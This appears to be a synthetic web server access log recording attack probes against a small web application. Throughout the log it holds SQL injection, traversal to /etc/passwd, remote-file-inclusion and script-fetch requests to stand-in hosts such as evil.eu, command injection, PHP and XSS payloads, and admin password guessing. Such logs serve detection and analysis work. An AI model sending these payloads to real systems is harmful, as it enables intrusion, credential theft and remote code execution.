87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 10694 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 5547 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 45263 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 31047 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 40371 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 54697 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 10087 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 68625 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 78364 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [09/Aug/2021:11:39:21 +0200] "POST /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 404 22337 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
220.243.135.5 - - [09/Aug/2021:11:39:31 +0200] "GET /core/files/js/upload.js/?username=admin&password=admin2 HTTP/1.0" 200 26613 "/index.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:39:32 +0200] "GET /register.php/ HTTP/1.0" 200 64531 "/connection.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [09/Aug/2021:11:39:33 +0200] "GET /login.php/ HTTP/1.0" 200 81451 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:39:34 +0200] "GET /core/themes/theme.inc/.env/README.txt HTTP/1.0" 200 42517 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [09/Aug/2021:11:39:35 +0200] "GET /login.php/?username=admin&password=admin2 HTTP/1.0" 200 5324 "/api/v1/register/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:39:36 +0200] "GET /api/v1/login/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 404 72116 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [09/Aug/2021:11:39:37 +0200] "GET /orders.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 404 28420 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
45.61.164.120 - - [09/Aug/2021:11:39:38 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 20092 "/login.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
54.36.149.94 - - [09/Aug/2021:11:39:39 +0200] "GET /update.php/?ip=|+ls+-l HTTP/1.1" 403 1379 "/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
69.46.0.142 - - [09/Aug/2021:11:39:40 +0200] "GET /core/files/js/editor.js/?id=0%20or%201=1 HTTP/1.0" 504 31811 "/update.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
45.61.164.120 - - [09/Aug/2021:11:39:41 +0200] "GET /api/v1/customers/?file=http://evil.eu/root.asp HTTP/1.0" 404 21864 "/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [09/Aug/2021:11:39:42 +0200] "GET /login.php/?username=admin&password=1237 HTTP/1.1" 404 80541 "/login.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
62.109.16.162 - - [09/Aug/2021:11:39:43 +0200] "GET /blog/how-to-shop/?page=1&customerId=AND%id%IS%NULL; HTTP/1.1" 200 27735 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 20865 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 63723 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 4258 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 47974 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 11065 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 24980 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 1520 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 52314 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 70899 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.52 - - [09/Aug/2021:11:39:44 +0200] "GET /index.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 400 74431 "/xmlrpc.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
31.184.238.22 - - [09/Aug/2021:11:39:54 +0200] "GET /api/v1/customers/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 15175 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [09/Aug/2021:11:39:55 +0200] "GET /api/v1/customers/?username=admin&password=admin2 HTTP/1.0" 404 64733 "/connection.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
31.184.238.22 - - [09/Aug/2021:11:39:56 +0200] "GET /api/v1/login/?customerId=1OR%201=1 HTTP/1.1" 200 39955 "/update.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:39:57 +0200] "GET /orders.php/?username=admin&password=1234 HTTP/1.0" 200 8845 "/api/v1/login/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:39:58 +0200] "GET /?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.1" 200 25412 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:39:59 +0200] "GET /update.php/?username=admin&password=1235 HTTP/1.0" 404 51421 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:39:59 +0200] "GET /update.php/?username=admin&password=1235 HTTP/1.0" 404 15760 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:39:59 +0200] "GET /update.php/?username=admin&password=1235 HTTP/1.0" 404 67374 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:39:59 +0200] "GET /update.php/?username=admin&password=1235 HTTP/1.0" 404 19754 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:39:59 +0200] "GET /update.php/?username=admin&password=1235 HTTP/1.0" 404 35690 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [09/Aug/2021:11:40:04 +0200] "GET / HTTP/1.1" 200 20512 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
62.109.16.162 - - [09/Aug/2021:11:40:05 +0200] "GET /?file=http://evil.eu/sh HTTP/1.1" 200 79954 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:40:06 +0200] "GET /index.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 80565 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:40:07 +0200] "GET /page/about-us/?username=admin&password=1237 HTTP/1.0" 404 44138 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [09/Aug/2021:11:40:08 +0200] "GET /register.php/?username=admin&password=1239 HTTP/1.0" 200 52800 "/update.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [09/Aug/2021:11:40:09 +0200] "GET /api/v1/login/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 503 48862 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
45.61.164.120 - - [09/Aug/2021:11:40:10 +0200] "POST /index.php/?id=0%20or%201=1 HTTP/1.0" 200 73244 "/register.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
5.13.35.65 - - [09/Aug/2021:11:40:11 +0200] "GET /update.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 200 75111 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
87.251.81.179 - - [09/Aug/2021:11:40:12 +0200] "POST /api/v1/register/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 404 52251 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:13 +0200] "GET /api/v1/customers/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 27832 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:13 +0200] "GET /api/v1/customers/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 3373 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:13 +0200] "GET /api/v1/customers/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 61870 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:13 +0200] "GET /api/v1/customers/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 69233 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:13 +0200] "GET /api/v1/customers/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 26338 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
86.125.112.230 - - [09/Aug/2021:11:40:18 +0200] "GET /api/v1/customers/?file=http://evil.eu/root.asp HTTP/1.0" 200 47543 "/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
220.243.135.5 - - [09/Aug/2021:11:40:19 +0200] "GET /login.php/.well-known/assetlinks.json HTTP/1.0" 200 67099 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
31.184.238.22 - - [09/Aug/2021:11:40:20 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.1" 200 39972 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
54.36.149.94 - - [09/Aug/2021:11:40:21 +0200] "GET /core/files/js/editor.js/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0" 404 77565 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:22 +0200] "GET / HTTP/1.0" 200 6511 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:40:23 +0200] "GET /index.php/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 77823 "/xmlrpc.php/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:40:24 +0200] "GET /update.php/?username=admin&password=1238 HTTP/1.0" 200 25781 "/update.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
220.243.135.5 - - [09/Aug/2021:11:40:25 +0200] "GET /core/themes/theme.inc/?username=admin&password=1237 HTTP/1.0" 200 21483 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
87.251.81.179 - - [09/Aug/2021:11:40:26 +0200] "POST /?page=/../../../../../../etc/passwd HTTP/1.0" 200 89800 "/index.php/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
31.184.238.22 - - [09/Aug/2021:11:40:27 +0200] "GET /orders.php/ HTTP/1.0" 200 48221 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:28 +0200] "GET /orders.php/?username=admin&password=1236 HTTP/1.0" 200 59731 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:28 +0200] "GET /orders.php/?username=admin&password=1236 HTTP/1.0" 200 28052 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:28 +0200] "GET /orders.php/?username=admin&password=1236 HTTP/1.0" 200 36094 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:28 +0200] "GET /orders.php/?username=admin&password=1236 HTTP/1.0" 200 34243 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:40:28 +0200] "GET /orders.php/?username=admin&password=1236 HTTP/1.0" 200 85288 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [09/Aug/2021:11:40:33 +0200] "GET /?username=admin&password=1234 HTTP/1.0" 200 57168 "/index.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
86.125.112.230 - - [09/Aug/2021:11:40:34 +0200] "GET /connection.php/ HTTP/1.0" 504 44641 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
220.243.135.5 - - [09/Aug/2021:11:40:35 +0200] "GET /core/themes/theme.inc/?username=admin&password=1238 HTTP/1.0" 200 43649 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
1.2.169.95 - - [09/Aug/2021:11:40:36 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 60675 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [09/Aug/2021:11:40:37 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.0" 200 60073 "/core/files/js/upload.js/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
121.225.26.201 - - [09/Aug/2021:11:40:38 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 53008 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:40:38 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 48266 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:40:38 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 62877 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:40:38 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 68166 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:40:38 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 83277 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:40:43 +0200] "GET /api/v1/customers/?username=admin&password=1238 HTTP/1.0" 200 27945 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11"
87.251.81.179 - - [09/Aug/2021:11:40:44 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 503 54344 "/register.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
209.133.212.79 - - [09/Aug/2021:11:40:45 +0200] "POST /core/files/js/upload.js/?username=admin&password=1235 HTTP/1.0" 504 35362 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
182.34.27.162 - - [09/Aug/2021:11:40:46 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 403 66082 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:40:46 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 403 82282 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:40:46 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 403 69964 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:40:46 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 403 82455 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:40:46 +0200] "GET /register.php/?file=http://evil.eu/sh HTTP/1.0" 403 6488 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
103.36.79.144 - - [09/Aug/2021:11:40:51 +0200] "GET /api/v1/customers/%u0061?[buffer]=89898 HTTP/1.0" 404 62130 "/api/v1/register/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
54.36.149.52 - - [09/Aug/2021:11:40:52 +0200] "GET /index.php/ HTTP/1.0" 200 43320 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
115.221.121.44 - - [09/Aug/2021:11:40:53 +0200] "GET /index.php/?username=admin&password=1236 HTTP/1.0" 200 30906 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:40:54 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.0" 400 28278 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:40:55 +0200] "GET /blog/how-to-shop/ HTTP/1.1" 200 21243 "/update.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
121.225.26.201 - - [09/Aug/2021:11:40:56 +0200] "GET /orders.php/ HTTP/1.0" 200 47029 "/login.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
182.34.27.162 - - [09/Aug/2021:11:40:57 +0200] "GET /core/themes/theme.inc/?username=admin&password=1236 HTTP/1.0" 200 81036 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 27397 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
